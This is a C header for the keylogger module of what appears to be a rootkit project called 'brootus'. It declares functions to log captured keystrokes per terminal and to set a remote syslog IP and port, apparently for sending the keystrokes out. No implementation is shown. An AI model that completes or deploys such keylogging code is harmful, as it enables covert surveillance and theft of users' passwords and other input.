#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include "brootus.h"

BROOTUS_MODULE(keylogger);

extern unsigned int syslog_ip_bin;
extern unsigned short syslog_port_bin;

extern void set_syslog_ip(char* ip_str);
extern void set_syslog_port(unsigned short port);
extern void log_keys(char* vt_name, char* keys, int len);

#endif

